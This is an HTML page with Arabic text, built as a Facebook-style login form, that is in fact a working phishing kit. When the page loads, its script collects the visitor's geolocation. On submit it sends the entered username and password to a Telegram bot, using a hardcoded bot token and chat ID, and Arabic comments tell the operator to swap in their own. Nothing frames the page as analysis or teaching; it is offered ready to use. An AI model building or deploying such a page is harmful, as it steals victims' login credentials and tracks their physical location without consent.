<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 350px;
            padding: 20px;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #1877f2;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 6px;
            background-color: #fafafa;
            color: #333;
            font-size: 16px;
        }
        .input-group input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 5px rgba(24, 119, 242, 0.5);
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .submit-btn:hover {
            background-color: #166fe5;
        }
        .alert {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
        }
        .alert-danger {
            background-color: #f44336;
            color: white;
        }
        .alert-success {
            background-color: #4caf50;
            color: white;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #65676b;
        }
        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .separator span {
            margin: 0 10px;
        }
        .signup-link {
            margin-top: 15px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .signup-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
        <div class="input-group">
            <label for="username">اسم المستخدم:</label>
            <input type="text" id="username" name="username" required>
        </div>
        <div class="input-group">
            <label for="password">كلمة المرور:</label>
            <input type="password" id="password" name="password" required>
        </div>
        <button type="submit" class="submit-btn">تسجيل الدخول</button>
    </form>
    <div id="locationAlert" class="alert"></div>
    <div class="separator"><span>أو</span></div>
    <a href="#" class="signup-link">إنشاء حساب جديد</a>
</div>

<script>
// قم بتغيير القيم التالية بتوكن بوتك الخاص بك ومعرف الدردشة
const TELEGRAM_BOT_TOKEN = '8104735798:AAGstSFp66i5aG0-uKofVqWWiIbLbE5wpjA'; // هنا قم بتغييره بتوكن بوتك الخاص بك
const CHAT_ID = '1346665329'; // هنا قم بتغييره بمعرف الدردشة الخاص بك

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
    } else {
        showAlert('alert-danger', 'المتصفح لا يدعم جغرافيا الويب.');
    }
}

function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    const locationMessage = `الموقع: خط العرض: ${latitude}, خط الطول: ${longitude}`;

    // إرسال موقع المستخدم إلى بوت تيليجرام
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: locationMessage
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            showAlert('alert-success', 'تم إرسال موقعك بنجاح.');
        } else {
            showAlert('alert-danger', 'خطأ في إرسال موقعك.');
        }
    })
    .catch(error => {
        showAlert('alert-danger', 'حدث خطأ أثناء إرسال موقعك.');
        console.error('حدث خطأ:', error);
    });
}

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            showAlert('alert-danger', 'لم يتم السماح بوصول الموقع. يرجى تفعيل خدمة تحديد الموقع في إعدادات هاتفك.');
            break;
        case error.POSITION_UNAVAILABLE:
            showAlert('alert-danger', 'معلومات الموقع غير متاحة.');
            break;
        case error.TIMEOUT:
            showAlert('alert-danger', 'الطلب لتحديد الموقع أدى إلى وقت انتظار.');
            break;
        case error.UNKNOWN_ERROR:
            showAlert('alert-danger', 'خطأ غير معروف.');
            break;
    }
}

function showAlert(type, message) {
    const alertDiv = document.getElementById('locationAlert');
    alertDiv.className = `alert ${type}`;
    alertDiv.textContent = message;
}

// جمع موقع المستخدم عند تحميل الصفحة
getLocation();

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // منع السلوك الافتراضي للنموذج

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;

    // إرسال بيانات المستخدم إلى بوت تيليجرام
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('تم إرسال البيانات بنجاح!');
        } else {
            alert('حدث خطأ أثناء إرسال البيانات.');
        }
    })
    .catch(error => {
        console.error('حدث خطأ:', error);
        alert('حدث خطأ أثناء إرسال البيانات.');
    });
});
</script>

</body>
</html>
